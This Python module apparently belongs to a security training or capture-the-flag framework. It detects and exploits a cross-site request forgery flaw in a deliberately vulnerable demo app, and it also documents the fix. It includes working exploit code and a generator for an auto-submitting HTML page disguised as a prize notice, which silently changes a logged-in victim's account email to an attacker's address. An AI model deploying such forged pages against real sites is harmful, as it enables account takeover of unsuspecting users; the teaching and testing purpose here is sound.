"""Cross-Site Request Forgery (CSRF) -- detect, exploit, and remediate.

WHAT IT IS
----------
CSRF abuses the browser's habit of *automatically attaching a victim's cookies*
to every request it makes to a site -- including requests triggered by a *different*
site the victim happens to be visiting. If a state-changing endpoint authenticates
purely on that ambient cookie and asks for no further proof that the request was
*intended* (no unpredictable anti-CSRF token, no re-authentication, no
``SameSite`` constraint), then an attacker's page can silently submit a forged
request *as the victim*. The demo app's ``/account/email`` handler is the classic
shape::

    def change_email(self):                 # POST /account/email
        user = self._session_user()         # trusts the ambient session cookie
        if not user:
            return 401
        email = self._form()["email"]       # a "simple" form body, no token
        UPDATE users SET email=? WHERE username=?   # a real state change
        return {"status": "updated", ..., "flag": FLAGS["csrf"]}

There is *no token field*, the body is an ordinary
``application/x-www-form-urlencoded`` form (a "simple request" that a cross-origin
HTML ``<form>`` can send without a CORS preflight), and ownership rests entirely on
the cookie -- so any page on the internet can drive this state change for any
logged-in victim.

HOW WE DISCOVER IT
------------------
Three signals, building confidence:

1. **No token on the legit form / no token required.** We submit the state change
   with *only* the victim cookie and *no* anti-CSRF token. A protected endpoint
   would reject this (HTTP 403 / "invalid token"); this one accepts it (HTTP 200,
   ``"status": "updated"``) -- proof the request is authorised by the cookie alone.
2. **Simple content type accepted.** The change is accepted with a plain
   ``application/x-www-form-urlencoded`` body -- the exact content type a
   cross-origin ``<form>`` can send with no preflight, so the forgery is reachable
   from any site.
3. **No SameSite protection on the session cookie.** When the app mints a session
   (``/login``), its ``Set-Cookie`` carries no ``SameSite`` attribute, so the
   browser will attach it on cross-site POSTs -- the precondition CSRF depends on.

HOW WE EXPLOIT IT
-----------------
We *simulate the victim's browser*: a :class:`WebClient` carrying the victim's
session cookie (``session=alice-sid``) -- exactly the cookie the browser would
auto-attach -- POSTs the forged ``email`` change with no token. The server applies
the change and returns JSON whose ``flag`` field is the planted
``FLAGS["csrf"]`` -- proof the state change went through under the victim's
identity. We also build the *real-world weapon*: an auto-submitting HTML page
(:func:`build_poc`) that, if a logged-in victim merely opened it, would fire the
same forged POST from their browser.

THE FIX
-------
See :data:`REMEDIATION`. In one line: bind every state-changing request to an
unpredictable, per-session anti-CSRF token (synchroniser-token / double-submit)
*and* set ``SameSite=Lax`` (or ``Strict``) on session cookies so the browser will
not attach them to cross-site requests in the first place.
"""
from __future__ import annotations

from typing import Dict, List, Optional, Tuple
from urllib.parse import quote

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Protect every state-changing request (POST/PUT/PATCH/DELETE) with an "
    "unpredictable, per-session anti-CSRF token: generate a cryptographically "
    "random token, embed it in the form (the synchroniser-token pattern) or mirror "
    "it in a cookie and a header (double-submit), and reject any request whose token "
    "is missing or does not match the session. Add defence in depth: set the session "
    "cookie to SameSite=Lax (or Strict) so browsers do not attach it to cross-site "
    "requests, mark it HttpOnly and Secure, verify the Origin/Referer header against "
    "an allow-list of your own origins, and require re-authentication or a "
    "fetch-metadata check (Sec-Fetch-Site) for sensitive changes. Never authorise a "
    "state change on the ambient session cookie alone, and never rely on a 'simple' "
    "content type as a security boundary -- an HTML form can send "
    "application/x-www-form-urlencoded cross-origin with no preflight."
)

#: The forgeable state-change sink, used as the Finding endpoint.
ENDPOINT: str = "/account/email"

#: The forged value we set the victim's email to (an attacker-controlled address
#: is the canonical account-takeover primitive -- redirect password resets).
FORGED_EMAIL: str = "attacker@evil.example"

#: Field names a *protected* endpoint would have required; their ABSENCE from the
#: accepted request is part of what proves the vulnerability. The "payloads" here
#: are the forged form bodies we submit (no token among them).
PAYLOADS: List[str] = [
    f"email={FORGED_EMAIL}",                       # the forged change, no token
    "email=takeover@attacker.test",               # alternate forged value
    f"email={FORGED_EMAIL}&csrf_token=",           # empty token still accepted
    f"email={FORGED_EMAIL}&csrf_token=guessed",    # wrong token still accepted
]


# --- low-level probe ---------------------------------------------------------
def _victim_headers() -> Dict[str, str]:
    """The Cookie header a victim's browser would auto-attach to /account/email."""
    return {"Cookie": f"{C.SESSION_COOKIE}={C.VICTIM_SESSION}"}


def _forge_change(
    client: WebClient, email: str, *, with_cookie: bool = True
) -> Response:
    """Submit the forged email change as a simple cross-origin form would.

    ``with_cookie=True`` simulates the victim's browser auto-attaching the session
    cookie; ``with_cookie=False`` is the control (no session) used to prove the
    change really is gated on -- and only on -- that ambient cookie.
    """
    headers = _victim_headers() if with_cookie else {}
    # data=... makes WebClient send application/x-www-form-urlencoded -- the exact
    # "simple" content type a cross-site <form> uses with no CORS preflight.
    return client.post("/account/email", data={"email": email}, headers=headers)


# --- detection ---------------------------------------------------------------
def detect_no_token_required(client: WebClient) -> Tuple[bool, str]:
    """True if the state change is accepted with the cookie alone and NO token.

    Sends the forged form with only the victim's session cookie -- no anti-CSRF
    token. A protected endpoint rejects this (403 / "invalid token"); accepting it
    (200 + ``"status": "updated"``) is the smoking gun.
    """
    resp = _forge_change(client, FORGED_EMAIL)
    accepted = resp.status == 200 and '"status": "updated"' in resp.text
    if accepted:
        return True, (
            f"POST {ENDPOINT} accepted with session cookie and NO anti-CSRF "
            f"token (HTTP {resp.status}); server responded "
            f'{resp.text.strip()[:120]}'
        )
    return False, ""


def detect_simple_content_type(client: WebClient) -> Tuple[bool, str]:
    """True if a plain form-urlencoded body is accepted (cross-origin reachable).

    ``application/x-www-form-urlencoded`` is a CORS "simple" content type, so a
    cross-site HTML ``<form>`` can send it with no preflight -- meaning the forgery
    is reachable from any attacker page, not just same-origin script.
    """
    resp = _forge_change(client, FORGED_EMAIL)
    if resp.status == 200 and '"status": "updated"' in resp.text:
        return True, (
            "accepted an application/x-www-form-urlencoded body (a CORS 'simple' "
            "content type) -- a cross-origin <form> can send this with no preflight"
        )
    return False, ""


def detect_requires_auth(client: WebClient) -> Tuple[bool, str]:
    """Confirm the change really is gated on the session cookie (control case).

    Without a session cookie the endpoint returns 401 -- proving the authorisation
    rests entirely on the ambient cookie, the precondition CSRF exploits.
    """
    resp = _forge_change(client, FORGED_EMAIL, with_cookie=False)
    if resp.status == 401:
        return True, (
            "no-session request rejected (HTTP 401) -- the change is authorised by "
            "the ambient session cookie alone, exactly what CSRF abuses"
        )
    return False, ""


def detect_missing_samesite(client: WebClient) -> Tuple[bool, str]:
    """True if a freshly-minted session cookie carries no SameSite attribute.

    Logs in to obtain a Set-Cookie and inspects it: a cookie without
    ``SameSite=Lax/Strict`` is attached by the browser on cross-site POSTs, which
    is what makes the forgery fire.
    """
    resp = client.post("/login", data={"username": "alice", "password": "alicepass"})
    set_cookie = resp.header("Set-Cookie") or ""
    if set_cookie and "samesite" not in set_cookie.lower():
        return True, (
            f"session Set-Cookie has no SameSite attribute ({set_cookie!r}) -- the "
            "browser will attach it on cross-site requests"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_forge_change(
    client: WebClient, email: str = FORGED_EMAIL
) -> Tuple[bool, Optional[str], Dict[str, object]]:
    """Fire the forged POST as the victim and recover the proof flag.

    Returns ``(ok, flag, response_json)``. On success the server confirms the
    change and returns JSON whose ``flag`` field is ``C.FLAGS["csrf"]`` -- proof a
    state change ran under the victim's identity with no token.
    """
    resp = _forge_change(client, email)
    if resp.status != 200:
        return False, None, {}
    try:
        payload = resp.json()
    except ValueError:
        return False, None, {}
    ok = payload.get("status") == "updated" and payload.get("email") == email
    flag = payload.get("flag")
    return ok, flag, payload


# --- the real-world weapon ---------------------------------------------------
def build_poc(base_url: str, email: str = FORGED_EMAIL) -> str:
    """Build an auto-submitting HTML CSRF proof-of-concept page.

    If a logged-in victim merely *opened* this page, their browser would attach the
    session cookie and auto-submit the forged ``email`` change to the target -- the
    weaponised form of the exploit. The page is harmless as text; it is the
    artefact a report would attach to demonstrate impact.

    Args:
        base_url: The target's base URL (the form posts to ``{base_url}/account/email``).
        email:    The attacker-chosen value to set the victim's email to.
    """
    action = f"{base_url.rstrip('/')}{ENDPOINT}"
    # HTML-escape the values that land in attributes so the PoC is well-formed for
    # any email/url (defence even in our own attack artefact).
    safe_action = action.replace("&", "&amp;").replace('"', "&quot;")
    safe_email = email.replace("&", "&amp;").replace('"', "&quot;").replace("<", "&lt;")
    return (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "  <head><title>CSRF PoC -- you have won a prize!</title></head>\n"
        "  <body onload=\"document.forms[0].submit()\">\n"
        "    <!-- A logged-in victim who opens this page silently changes their\n"
        "         account email to the attacker's. The browser auto-attaches the\n"
        "         session cookie; no anti-CSRF token is required by the target. -->\n"
        f'    <form action="{safe_action}" method="POST">\n'
        f'      <input type="hidden" name="email" value="{safe_email}" />\n'
        "    </form>\n"
        "  </body>\n"
        "</html>\n"
    )


def build_poc_url(base_url: str, email: str = FORGED_EMAIL) -> str:
    """A no-JS fallback: the GET URL form of the PoC (for documentation).

    Note the *real* exploit is a POST; this URL variant illustrates how trivially
    the attacker controls the parameters and is useful in a written report.
    """
    return f"{base_url.rstrip('/')}{ENDPOINT}?email={quote(email)}"


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect CSRF, then exploit it (forge the email change as the victim).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["csrf"]`` and whose ``extra["poc_html"]`` is an auto-submitting PoC.
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    no_token, no_token_ev = detect_no_token_required(client)
    if no_token:
        techniques.append("no-token")
    simple_ct, simple_ct_ev = detect_simple_content_type(client)
    if simple_ct:
        techniques.append("simple-content-type")
    requires_auth, requires_auth_ev = detect_requires_auth(client)
    if requires_auth:
        techniques.append("cookie-only-auth")
    no_samesite, no_samesite_ev = detect_missing_samesite(client)
    if no_samesite:
        techniques.append("no-samesite")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, response_json = exploit_forge_change(client)
    if ok:
        techniques.append("forged-state-change")

    discovered = bool(no_token and ok)

    # 3) The weaponised PoC -------------------------------------------------
    poc_html = build_poc(client.base_url, FORGED_EMAIL)
    poc_url = build_poc_url(client.base_url, FORGED_EMAIL)

    # 4) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if no_token:
        evidence_parts.append(f"no-token: {no_token_ev}")
    if simple_ct:
        evidence_parts.append(f"simple-content-type: {simple_ct_ev}")
    if requires_auth:
        evidence_parts.append(f"cookie-only-auth: {requires_auth_ev}")
    if no_samesite:
        evidence_parts.append(f"no-samesite: {no_samesite_ev}")
    evidence = " || ".join(evidence_parts)

    exploit_result = {
        "flag": flag,
        "forged_email": FORGED_EMAIL,
        "server_response": response_json,
        "techniques": techniques,
        "summary": (
            f"forged POST {ENDPOINT} as the victim (no anti-CSRF token) changed "
            f"the account email to {FORGED_EMAIL!r}; server returned flag {flag!r}"
        ),
    }

    return Finding(
        vuln="Cross-Site Request Forgery (CSRF)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=f"email={FORGED_EMAIL}",
        extra={
            "poc_html": poc_html,
            "poc_url": poc_url,
            "forged_email": FORGED_EMAIL,
            "techniques": techniques,
            "no_token_required": no_token,
            "simple_content_type": simple_ct,
            "requires_auth": requires_auth,
            "missing_samesite": no_samesite,
            "forged_change_ok": ok,
        },
    )
